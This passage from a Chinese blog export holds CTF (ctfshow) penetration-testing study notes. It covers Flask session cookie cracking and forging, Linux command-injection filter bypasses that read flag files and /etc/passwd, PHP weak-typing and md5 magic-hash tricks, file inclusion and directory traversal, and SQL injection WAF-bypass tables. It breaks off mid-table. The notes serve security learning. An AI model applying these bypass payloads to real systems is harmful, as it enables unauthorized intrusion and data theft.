<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">破解秘钥并解密:</span><br><span class="line">flask-unsign --decode --cookie <span class="string">&#x27;eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss&#x27;</span></span><br><span class="line"></span><br><span class="line">破解秘钥并输出秘钥:</span><br><span class="line">flask-unsign --unsign --cookie <span class="string">&#x27;eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss&#x27;</span></span><br><span class="line"></span><br><span class="line">生成session:</span><br><span class="line">flask-unsign --sign --cookie <span class="string">&#x27;&#123;&quot;username&quot;:&quot;lbz&quot;,&quot;passwd&quot;:&quot;123&quot;&#125;&#x27;</span> --secret <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>linxu</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/linxu/</url>
    <content><![CDATA[<h1 id="linxu命令"><a class="markdownIt-Anchor" href="#linxu命令"></a> linxu命令:</h1>
<h2 id="1使用可以分隔两个命令一起执行"><a class="markdownIt-Anchor" href="#1使用可以分隔两个命令一起执行"></a> 1.使用;可以分隔两个命令一起执行</h2>
<h2 id="2echo-执行命令"><a class="markdownIt-Anchor" href="#2echo-执行命令"></a> 2.echo $()执行命令</h2>
<h2 id="3软连接"><a class="markdownIt-Anchor" href="#3软连接"></a> 3.软连接:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过软连接操作源文件</span><br></pre></td></tr></table></figure>
<h1 id="linxu的一些绕过"><a class="markdownIt-Anchor" href="#linxu的一些绕过"></a> linxu的一些绕过:</h1>
<h2 id="1符号绕过"><a class="markdownIt-Anchor" href="#1符号绕过"></a> 1.符号绕过:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用;号隔开每个命令，每个命令按照从左到右的顺序执行，彼此之间不关心是否失败，所有命令都会执行。</span><br><span class="line">command1 &amp; command2</span><br><span class="line">	&amp;放在启动参数后面表示设置此进程为后台进程，上面的命令会先执行command2，再执行command1</span><br><span class="line">command1 &amp;&amp; command2 [&amp;&amp; commandx]</span><br><span class="line">	&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令</span><br><span class="line">command1 || command2 [|| commandx]</span><br><span class="line">    跟&amp;&amp;符号相反，前面那条命令为假才会执行后面的命令</span><br><span class="line">    只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。–直到返回真的地方停止执行。</span><br><span class="line">命令执行:</span><br><span class="line">    &#123;cat,etc/passwd&#125;</span><br><span class="line">    cat$&#123;IFS&#125;flag.txt</span><br><span class="line">    cat$IFS$9flag.txt</span><br><span class="line">    cat$&#123;IFS&#125;flag.txt</span><br><span class="line">    cat&lt;flag.txt</span><br><span class="line">    cat&lt;&gt;flag.txt</span><br><span class="line">    c&#x27;&#x27;at&lt;flag</span><br><span class="line">    c&quot;&quot;at&lt;flag</span><br><span class="line">    c\a\t&lt;&gt;f\l\a\g.t\x\t</span><br><span class="line">    a=fl;b=ag;cat $a$b.php</span><br><span class="line">    `` 里面的命令优先执行 </span><br><span class="line">           `cat flag`</span><br><span class="line">    cat $(ls | grep fla)</span><br></pre></td></tr></table></figure>
<h2 id="2函数绕过"><a class="markdownIt-Anchor" href="#2函数绕过"></a> 2.函数绕过:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf绕过（字符串进制绕过）  ---配合``或者$()使用</span><br><span class="line">printf的格式化输出，可以将十六进制或者八进制的字符数字转化成其对应的ASCII字符内容输出。其格式为：</span><br><span class="line">    \NNN 八进制数 NNN 所代表的 ASCII 码字符。</span><br><span class="line">    \xHH 十六进制 HH 对应的8位字符。HH 可以是一到两位。</span><br><span class="line">    \uHHHH 十六进制 HHHH 对应的 Unicode 字符。HHHH 一到四位。</span><br><span class="line">    \UHHHHHHHH十六进制 HHHHHHHH 对应的 Unicode 字符。HHHHHHHH 一到八位</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h2 id="php特性"><a class="markdownIt-Anchor" href="#php特性"></a> php特性</h2>
<h3 id="1intval函数"><a class="markdownIt-Anchor" href="#1intval函数"></a> 1.intval函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br><span class="line">    <span class="number">1e9</span> 科学计数法</span><br></pre></td></tr></table></figure>
<h3 id="2v1v2但md5v1md5v2sha1加密的一系列问题"><a class="markdownIt-Anchor" href="#2v1v2但md5v1md5v2sha1加密的一系列问题"></a> 2.v1!=v2，但md5(v1)==md5(v2)/sha1加密的一系列问题</h3>
<h4 id="1对于不在意数据类型的情况"><a class="markdownIt-Anchor" href="#1对于不在意数据类型的情况"></a> 1.对于==不在意数据类型的情况:</h4>
<figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">在php中，变量都是弱类型的（就是不指定特定数据类型的），使用<span class="keyword">if</span>判等的时候要格外小心，使用特殊的参数可能会使本来不相等的<span class="keyword">if</span>判断位相等 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---传入a=s1885207154a，b=s1836677006a二者md5都是<span class="number">0</span>e开头，在php中<span class="number">0</span>e会被当做科学计数法，就算后面有字母，其结果也是<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">全字母原值:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">全数字原值:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">以下值在sha1加密后以<span class="number">0</span>E开头：</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
<p>2.对于===</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>
<h3 id="3in_array函数"><a class="markdownIt-Anchor" href="#3in_array函数"></a> 3.in_array()函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line">    --如果没有使用第三个值strict，那么needle如果为<span class="number">1</span>.php 则也会成功匹配</span><br></pre></td></tr></table></figure>
<h3 id="4reflectionclass类"><a class="markdownIt-Anchor" href="#4reflectionclass类"></a> 4.Reflectionclass类:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用 ReflectionClass，可以获取类的属性、方法、常量、父类、接口等信息，也可以动态地调用类的构造函数或方法等</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; 可以得到所有MyClass类的全部信息</span><br></pre></td></tr></table></figure>
<h3 id="5hex2bin函数"><a class="markdownIt-Anchor" href="#5hex2bin函数"></a> 5.hex2bin函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">赋值符号=优先级高于<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---转换十六进制字符串为二进制字符串</span><br><span class="line">is_numeric函数:   如果传入的参数只有一个e字母，则返回<span class="literal">true</span>---科学计数法，全是数字<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --这个命令通过base64，在bin2hex后，输出只有一个e的数字</span><br></pre></td></tr></table></figure>
<h3 id="6ereg函数php-7-中被移除"><a class="markdownIt-Anchor" href="#6ereg函数php-7-中被移除"></a> 6.ereg()函数(PHP 7 中被移除)</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ereg函数存在<span class="literal">NULL</span>截断漏洞，导致了正则过滤被绕过,所以可以使用%<span class="number">00</span>截断正则匹配</span><br></pre></td></tr></table></figure>
<h3 id="7exception类"><a class="markdownIt-Anchor" href="#7exception类"></a> 7.Exception类</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>是所有用户级异常的基类</span><br><span class="line">                             --第一个参数，会把返回值当作错误信息输出</span><br></pre></td></tr></table></figure>
<h3 id="8filesystemiterator文件系统迭代器"><a class="markdownIt-Anchor" href="#8filesystemiterator文件系统迭代器"></a> 8.FilesystemIterator文件系统迭代器</h3>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 是 PHP 中基于 SPL（Standard PHP Library）的一个迭代器类，用来遍历文件系统。</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---两种访问当前目录的方法</span><br></pre></td></tr></table></figure>
<h3 id="9-全局数组globals"><a class="markdownIt-Anchor" href="#9-全局数组globals"></a> 9. 全局数组$GLOBALS</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">全局数组<span class="variable">$GLOBALS</span>：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --输出全部信息</span><br></pre></td></tr></table></figure>
<h3 id="10procselfroot"><a class="markdownIt-Anchor" href="#10procselfroot"></a> 10./proc/self/root</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root 是 Linux 系统中一个特殊的符号链接，它始终指向当前进程的根目录。</span><br></pre></td></tr></table></figure>
<h3 id="11post传参"><a class="markdownIt-Anchor" href="#11post传参"></a> 11.post传参</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">特性<span class="number">1</span>：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _</span><br><span class="line">特性<span class="number">2</span>：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换  ---php8以前</span><br></pre></td></tr></table></figure>
<h3 id="12传参时"><a class="markdownIt-Anchor" href="#12传参时"></a> 12.传参时</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --绕过关键字</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --文件包含</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="13eval函数与assert函数"><a class="markdownIt-Anchor" href="#13eval函数与assert函数"></a> 13.eval函数与assert函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都用于执行php函数 </span><br></pre></td></tr></table></figure>
<h3 id="14_serverargv"><a class="markdownIt-Anchor" href="#14_serverargv"></a> 14.$_SERVER[‘argv’]</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] 就等于 <span class="variable">$_SERVER</span>[‘QUERY_STRING’]，<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 就是查询 (query) 的字符串</span><br><span class="line">                                    ---URL中 ? 号后面的原始参数字符串（不解析，不解码，直接拿原样的 query <span class="keyword">string</span>）。</span><br><span class="line">                                    ---需要php.ini 开启了register_argc_argv 配置项。</span><br></pre></td></tr></table></figure>
<h3 id="15extract函数"><a class="markdownIt-Anchor" href="#15extract函数"></a> 15.extract函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">从数组中将变量导入到当前的符号表</span><br><span class="line">一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</span><br><span class="line">    ---只需要键值对就行了?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,这样也会解析              </span><br></pre></td></tr></table></figure>
<h3 id="16gettext拓展"><a class="markdownIt-Anchor" href="#16gettext拓展"></a> 16.gettext拓展:</h3>
<figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()等价于_()</span><br><span class="line">      --使用gettext()相当于echo </span><br></pre></td></tr></table></figure>
<h3 id="17stripos函数"><a class="markdownIt-Anchor" href="#17stripos函数"></a> 17.stripos()函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">        --配合目录穿越使用../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
<h3 id="18正则表达式溢出"><a class="markdownIt-Anchor" href="#18正则表达式溢出"></a> 18.正则表达式溢出:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则(pcre)最大回溯/递归限制</span><br><span class="line">    在使用.*?ctfshow非贪婪模式时--匹配到了ctfshow，但是如果ctfshow前面有<span class="number">10</span>万个字符，那么正则会返回<span class="literal">false</span></span><br><span class="line">        --使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</span><br><span class="line">        --默认的backtrack_limit是<span class="number">100000</span></span><br></pre></td></tr></table></figure>
<h3 id="19php运算符优先级"><a class="markdownIt-Anchor" href="#19php运算符优先级"></a> 19.php运算符优先级</h3>
<table>
<thead>
<tr>
<th>优先级</th>
<th>运算符</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><code>()</code></td>
<td>括号（表达式分组）</td>
<td>`($a &amp;&amp; $b)</td>
</tr>
<tr>
<td>2</td>
<td><code>!</code></td>
<td>逻辑非</td>
<td><code>!$a</code></td>
</tr>
<tr>
<td>3</td>
<td><code>* / %</code></td>
<td>乘 / 除 / 取模</td>
<td><code>$a * $b</code>, <code>$a % $b</code></td>
</tr>
<tr>
<td>4</td>
<td><code>+ -</code></td>
<td>加 / 减</td>
<td><code>$a + $b</code></td>
</tr>
<tr>
<td>5</td>
<td><code>.</code></td>
<td>字符串连接</td>
<td><code>$a . $b</code></td>
</tr>
<tr>
<td>6</td>
<td><code>&lt; &gt; &lt;= &gt;=</code></td>
<td>比较大小</td>
<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
</tr>
<tr>
<td>7</td>
<td><code>== != === !==</code></td>
<td>相等 / 不等 / 全等等</td>
<td><code>$a === $b</code>, <code>$a != $b</code></td>
</tr>
<tr>
<td>8</td>
<td><code>&amp;</code></td>
<td>按位与</td>
<td><code>$a &amp; $b</code></td>
</tr>
<tr>
<td>9</td>
<td><code>^</code></td>
<td>按位异或</td>
<td><code>$a ^ $b</code></td>
</tr>
<tr>
<td>10</td>
<td>`</td>
<td>`</td>
<td>按位或</td>
</tr>
<tr>
<td>11</td>
<td><code>&amp;&amp;</code></td>
<td>逻辑与（短路）</td>
<td><code>$a &amp;&amp; $b</code></td>
</tr>
<tr>
<td>12</td>
<td>`</td>
<td></td>
<td>`</td>
</tr>
<tr>
<td>13</td>
<td><code>?:</code></td>
<td>三元运算（条件表达式）</td>
<td><code>$a ? $b : $c</code></td>
</tr>
<tr>
<td>14</td>
<td><code>=</code> <code>+=</code> <code>-=</code> 等</td>
<td>赋值及复合赋值</td>
<td><code>$a = $b</code>, <code>$a += 1</code></td>
</tr>
<tr>
<td>15</td>
<td><code>and</code></td>
<td>逻辑与（低优先）</td>
<td><code>$a = true and false</code></td>
</tr>
<tr>
<td>16</td>
<td><code>or</code></td>
<td>逻辑或（最低优先）</td>
<td><code>$a = false or true</code></td>
</tr>
</tbody>
</table>
<h3 id="20parse_str函数"><a class="markdownIt-Anchor" href="#20parse_str函数"></a> 20.parse_str()函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">如果 <span class="keyword">string</span> 是 URL 传递入的查询字符串（query <span class="keyword">string</span>），</span><br><span class="line">则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP <span class="number">7.2</span> 中将废弃不设置参数的行为。</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> 起，result 参数是强制的。</span><br><span class="line">对于<span class="title function_ invoke__">parse_str</span>()，如果传入的是一个数组，例如arr[]=<span class="number">1</span>，则会将变量保存在数组当中arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="21类"><a class="markdownIt-Anchor" href="#21类"></a> 21.类</h3>
<h4 id="1非静态方法无static"><a class="markdownIt-Anchor" href="#1非静态方法无static"></a> 1.非静态方法(无static)</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直接<span class="keyword">new</span>一个对象，通过对象来进行调用</span><br></pre></td></tr></table></figure>
<h4 id="2静态方法static"><a class="markdownIt-Anchor" href="#2静态方法static"></a> 2.静态方法(static)</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">静态方法在类ctfshow，限制了不能去<span class="keyword">new</span>，直接::调用即可</span><br></pre></td></tr></table></figure>
<h3 id="22call_user_func函数与call_user_func_array函数类似"><a class="markdownIt-Anchor" href="#22call_user_func函数与call_user_func_array函数类似"></a> 22.call_user_func()函数与call_user_func_array()函数类似:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"> --如果传递一个数组，对于类来说，会把数组的第一个元素当作类名，第二个元素当作类的函数</span><br></pre></td></tr></table></figure>
<h3 id="23php-弱类型特性"><a class="markdownIt-Anchor" href="#23php-弱类型特性"></a> 23.PHP 弱类型特性(==)</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP 弱比较 == 的转换规则：</span><br><span class="line">   如果一边是数字，另一边是字符串，PHP 会尝试把字符串转换为数字！ </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>比较类型</th>
<th>PHP行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>数字 vs 字符串</td>
<td>字符串会被<strong>强制转换为数字</strong>再比较</td>
</tr>
<tr>
<td>字符串 vs 字符串（若一方看起来像数字）</td>
<td>会尝试<strong>两边都转成数字</strong>再比较</td>
</tr>
<tr>
<td>布尔 vs 任意类型</td>
<td>会都转成布尔值再比较</td>
</tr>
<tr>
<td>数组/对象 vs 标量</td>
<td>一律为 <code>false</code></td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="24create_function函数"><a class="markdownIt-Anchor" href="#24create_function函数"></a> 24.create_function()函数:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> sql注入</h2>
<p>执行顺序</p>
<table>
<thead>
<tr>
<th>顺序</th>
<th>关键字</th>
<th>含义与攻防要点</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><code>FROM</code></td>
<td>确定表或子查询来源（注入点常见于表别名、子查询）</td>
</tr>
<tr>
<td>2</td>
<td><code>JOIN</code> / <code>ON</code></td>
<td>联表条件（逻辑可控时可用 UNION/FUZZ 触发错误或盲注）</td>
</tr>
<tr>
<td>3</td>
<td><code>WHERE</code></td>
<td>行级过滤（布尔盲注/时间盲注/报错注入常驻地）</td>
</tr>
<tr>
<td>4</td>
<td><code>GROUP BY</code></td>
<td>分组，常与 <code>HAVING</code> 配合注入</td>
</tr>
<tr>
<td>5</td>
<td><code>HAVING</code></td>
<td>分组后的过滤（绕过 WAF 替代 WHERE）</td>
</tr>
<tr>
<td>6</td>
<td><code>SELECT</code></td>
<td>指定查询字段（可构造 <code>select sleep(3)</code> 或 <code>select updatexml(...)</code> 等）</td>
</tr>
<tr>
<td>7</td>
<td><code>DISTINCT</code></td>
<td>去重，对结果影响较大，攻击中不常利用</td>
</tr>
<tr>
<td>8</td>
<td><code>ORDER BY</code></td>
<td>排序（布尔盲注中可用排序条件泄露差异）</td>
</tr>
<tr>
<td>9</td>
<td><code>LIMIT</code></td>
<td>限制返回数量（配合联合注入可用）</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>关键字</th>
<th>攻击常用点</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SELECT</code></td>
<td>暴露字段、构造 payload</td>
<td><code>select user(),database()</code> 等</td>
</tr>
<tr>
<td><code>FROM</code></td>
<td>子查询注入点、库名控制</td>
<td>子查询中 <code>from(select(...))</code> 常用</td>
</tr>
<tr>
<td><code>JOIN ON</code></td>
<td>构造逻辑绕过</td>
<td>rarely used，但可配合注入</td>
</tr>
<tr>
<td><code>WHERE</code></td>
<td>盲注、报错主战场</td>
<td><code>WHERE 1=1 and updatexml(...)</code></td>
</tr>
<tr>
<td><code>GROUP BY</code></td>
<td>为 <code>HAVING</code> 绕过铺路</td>
<td>绕过 <code>WHERE</code> 关键词检测</td>
</tr>
<tr>
<td><code>HAVING</code></td>
<td>替代 WHERE</td>
<td>例如 <code>HAVING 1=1</code> 绕WAF</td>
</tr>
<tr>
<td><code>UNION</code></td>
<td>联合注入核心</td>
<td><code>UNION SELECT 1,2,3</code> 爆字段</td>
</tr>
<tr>
<td><code>ORDER BY</code></td>
<td>猜字段数 / 触发排序盲注</td>
<td><code>ORDER BY 1</code>，多用于布尔盲注</td>
</tr>
<tr>
<td><code>LIMIT</code></td>
<td>限制数据回显</td>
<td>控制数据精度，配合 <code>OFFSET</code></td>
</tr>
</tbody>
</table>
<h3 id="常见过滤绕过"><a class="markdownIt-Anchor" href="#常见过滤绕过"></a> 常见过滤绕过:</h3>
<h4 id="1对空格的绕过"><a class="markdownIt-Anchor" href="#1对空格的绕过"></a> 1.对空格的绕过:</h4>
<p>也可以用()括号，绕过空格</p>
<table>
<thead>
<tr>
<th>绕过方式</th>
<th>替代表达</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%09</code></td>
<td>制表符（Tab）</td>
<td><code>select%09*%09from</code></td>
</tr>
<tr>
<td><code>%0a</code></td>
<td>换行符（\n）</td>
<td><code>select%0a*%0afrom</code></td>
</tr>
<tr>
<td><code>%0b</code></td>
<td>垂直制表符</td>
<td>有些解析器可用</td>
</tr>
<tr>
<td><code>%0c</code></td>
<td>换页符</td>
<td>用得少但有效</td>
</tr>
<tr>
<td><code>%0d</code></td>
<td>回车符（\r）</td>
<td>Windows常见</td>
</tr>
<tr>
<td><code>/**/</code></td>
<td>SQL注释</td>
<td><code>select/**//*/**/from</code></td>
</tr>
<tr>
<td><code>+</code></td>
<td>URL 编码中空格</td>
<td><code>select+*+from</code>（仅限部分环境）</td>
</tr>
<tr>
<td><code>/*!*/</code></td>
<td>MySQL特有注释执行</td>
<td><code>select/*!00000*/from</code></td>
</tr>
<tr>
<td><code>\x0a</code>~<code>\x0d</code></td>
<td>字节级替代</td>
<td>特定语言解析器有效</td>
</tr>
<tr>
<td><code>0x20</code></td>
<td>空格的 hex</td>
<td>数据中拼接时用</td>
</tr>
</tbody>
</table>
<h4 id="2对和的过滤"><a class="markdownIt-Anchor" href="#2对和的过滤"></a> 2.对–+和#的过滤:</h4>
<table>
<thead>
<tr>
<th>绕过方式</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%23</code></td>
<td><code>#</code> → <code>%23</code></td>
<td>URL 编码</td>
</tr>
<tr>
<td><code>%2d%2d</code></td>
<td><code>--</code> → <code>%2d%2d</code></td>
<td>URL 编码绕过</td>
</tr>
<tr>
<td>空格注释变种</td>
<td><code>--\n</code>, <code>--\r</code>, <code>--\t</code></td>
<td>非 <code>--+</code> 写法尝试</td>
</tr>
<tr>
<td>字符拆解</td>
<td><code>- -</code>, <code>-- </code></td>
<td>分隔或双引号包含干扰识别</td>
</tr>
<tr>
<td>多行注释终止</td>
